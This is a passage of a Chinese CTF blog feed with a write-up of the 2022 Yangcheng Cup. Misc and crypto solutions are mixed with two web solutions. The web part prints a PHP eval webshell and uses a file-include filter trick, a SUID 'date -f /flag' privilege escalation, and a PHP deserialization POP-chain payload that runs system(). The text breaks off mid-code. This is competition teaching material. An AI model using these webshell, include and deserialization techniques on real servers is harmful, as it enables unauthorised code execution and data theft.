&lt;p&gt;2022HECTF是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，是面向全国大学生的一次竞技活动。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2022年羊城杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2022-09-04T05:46:20.000Z</published>
    <updated>2022-09-04T13:50:35.327Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、杭州安恒信息技术股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。</p><p>大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。</p><p>本届大赛由【广外女生战队】与杭州安恒信息技术股份有限公司共同命题，采用CTF（夺旗赛）团队竞赛模式，参赛队伍通过互联网在线解题，题目类型涉及Web安全、逆向工程 (Reverse)、二进制漏洞挖掘和利用（Pwn）、密码学（Crypto）、杂项（Misc）等类别。</p><p>比赛时间：9月3日 9:00 - 9月4日 9:00</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><blockquote><p>简单web</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? highlight_file(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(stristr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(fliter(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>非预期。Dirsearch扫一下发现他人上传的shell.php，利用file参数include+伪协议包含一下：</p><p><code>?file=php://filter/read=convert.base64-encode/resource=shell.php</code></p><p>base64解码得到源码：<code>&lt;?php @eval($_POST[a]);?&gt;</code></p><p>用蚁剑连接上，在根目录下发现flag，但是权限不够无法查看。</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code> 查看具有SUID权限的可执行文件，发现date命令可用，提权：</p><p><code>date -f /flag</code></p><p>在报错文字中获取flag内容。</p><p>​    </p><h3 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h3><blockquote><p>Wake up!Pop corn is not safe food,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Test/&quot;</span>,get_class(<span class="keyword">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;no pop&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>找反序列化pop链：</p><p><code>Test/getFlag() &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>由于类A存在过滤 <code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>，类A不能调类Test，利用上类Fun：</p><p><code>Fun/__call($f,$p)  &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span>:</span></span><br><span class="line">    private_func = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    public_a = Fun()</span><br><span class="line">     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="comment"># public_p = &#x27;ls /&#x27;</span></span><br><span class="line">    public_p = <span class="string">&#x27;cat /flag?&#x27;</span></span><br><span class="line">    public_a = A()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(serialize(B())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>由于类Fun有 <code>__wakeup()</code> 会清空 <code>private $func</code>，修改数字绕过 <code>__wakeup()</code>：</p><p><code>O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</code></p><p>传入pop参数得到flag。</p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="where-is-secret"><a href="#where-is-secret" class="headerlink" title="where_is_secret"></a>where_is_secret</h3><blockquote><p>easy_misc</p></blockquote><p>一个vig.txt和一个zip压缩包，txt中文字</p><p><code>Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo</code></p><p>使用<a href="https://guballa.de/vigenere-solver">在线维吉尼亚密码解密网站</a>解出明文：</p><p><code>Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds</code></p><p>用密码 <code>GWHT@R1nd0yyds</code> 解压zip，得到一张bmp图，根据比赛中期放的hint提示加密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">text</span>):</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>, encoding=<span class="string">&quot;gbk&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        all_text = f.read()</span><br><span class="line"></span><br><span class="line">        im = encode(all_text)</span><br><span class="line">        im.save(<span class="string">&quot;out.bmp&quot;</span>)</span><br></pre></td></tr></table></figure><p>通过爆破方法逆回原文本即可，发现原文为一本书，包含大量中文，还原时设置不输出中文，缩短运行时间：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&#x27;out.bmp&#x27;</span>)</span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line">text=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">       r,g,b = img.getpixel((x,y))</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">126</span>):</span><br><span class="line">           <span class="keyword">if</span> ((j &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>) == g <span class="keyword">and</span> j &amp; <span class="number">0xFF</span> == b:</span><br><span class="line">               text+=<span class="built_in">chr</span>(j)</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">pass</span></span><br><span class="line">       <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">           x = <span class="number">0</span></span><br><span class="line">           y += <span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">r&#x27;text.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(text)</span><br></pre></td></tr></table></figure><p>在得到的字符里，找到flag格式的且带有意义的字符，组成flag：<code>flag&#123;h1d3_1n_th3_p1ctur3&#125;</code>。</p><p>​    </p><h3 id="迷失幻境"><a href="#迷失幻境" class="headerlink" title="迷失幻境"></a>迷失幻境</h3><blockquote><p>走不出自责空间，沉溺于我们昨天，还能不能相见。</p></blockquote><p>用DiskGenius打开vmdk文件，在回收站发现一张可莉jpg图片和一张无文件类型后缀的幻境png图片，提取出来。</p><p>在“迷失幻境”夹子里有1张可莉jpg图片和100张一样的幻境png图片，前后相同图片的大小不同，尝试盲水印提取信息不成功，再尝试将幻境png大图与小图进行减（sub）操作，得到</p><p><img src="/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/solved.bmp" alt="solved" style="zoom:80%;"></p><p>key为 <code>可莉前来报道</code>。</p><p>回收站里可莉jpg图片存在备注信息 <code>猜不到，怎么想都猜不到吧。</code>，用outguess提取：</p><p><code>outguess -r keli.jpg -k &quot;可莉前来报道&quot; -t out.txt</code></p><p>得到flag：<code>DASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;</code>。</p><p>​    </p><h3 id="签个到"><a href="#签个到" class="headerlink" title="签个到"></a>签个到</h3><blockquote><p>签个到，请注意，本次比赛所有 flag 提交时都只需要提交括号内的字符串，比如这个题的 flag 如果是 flag{xxx}, 您只需要提交 xxx 即可得分。</p></blockquote><p><code>ZMJTPM33TIGQTLMDTV4JXLYQTNMQTAOLTSGTRMOLZD2JPMOETIEQBZ3PTZ2U2===</code>，初看为base32，解码为乱码。</p><p><code>flag&#123;</code> 对应base32编码为 <code>MZWGCZ33</code>，故为rot13+base32，解码得 <code>flag&#123;5f3c029eac023481fbd8d5ad15b73b34&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LRSA"><a href="#LRSA" class="headerlink" title="LRSA"></a>LRSA</h3><blockquote><p>RSA and some other things</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPQ</span>(<span class="params">p,q</span>):</span></span><br><span class="line">    P=getPrime(<span class="number">2048</span>)</span><br><span class="line">    Q=getPrime(<span class="number">2048</span>)</span><br><span class="line">    t=(p*P-<span class="number">58</span>*P+q)%Q</span><br><span class="line">    <span class="keyword">assert</span> (isPrime(Q))</span><br><span class="line">    <span class="keyword">return</span> P,Q,t</span><br><span class="line"></span><br><span class="line">B=getRandomNBitInteger(<span class="number">11</span>)</span><br><span class="line">p=getPrime(B)</span><br><span class="line">q=getPrime(B)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">P,Q,t=getPQ(p,q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B=&quot;</span>,B)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*P*Q=&quot;</span>,P*P*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*Q*Q=&quot;</span>,P*Q*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;t=&quot;</span>,t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br></pre></td></tr></table></figure></blockquote><p>$\gcd(P \cdot P \cdot Q,P \cdot Q \cdot Q)=P \cdot Q$，继而求得 $P$ 和 $Q$，又有 $t=(P \cdot(p-58)+q) \bmod Q$，构造格 $\begin{bmatrix} 1 &amp; P \newline 0 &amp; Q \end{bmatrix}$，利用LLL算法规约得到 $p-58$ 和 $q$ 值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">B = <span class="number">1023</span></span><br><span class="line">PPQ = <span class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ = <span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t = <span class="number">44</span></span><br><span class="line">c = <span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">PQ = gcd(PPQ,PQQ)</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line"><span class="built_in">print</span>(P)</span><br><span class="line"><span class="built_in">print</span>(Q)</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ,[[<span class="number">1</span>,P],[<span class="number">0</span>,Q]])</span><br><span class="line">x = A.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = -x+<span class="number">58</span></span><br><span class="line">q = (t-P*(p-<span class="number">58</span>))%Q</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;8f3djoj9wedj2_dkc903cwckckdk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EasyRsa"><a href="#EasyRsa" class="headerlink" title="EasyRsa"></a>EasyRsa</h3><blockquote><p>really easy rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 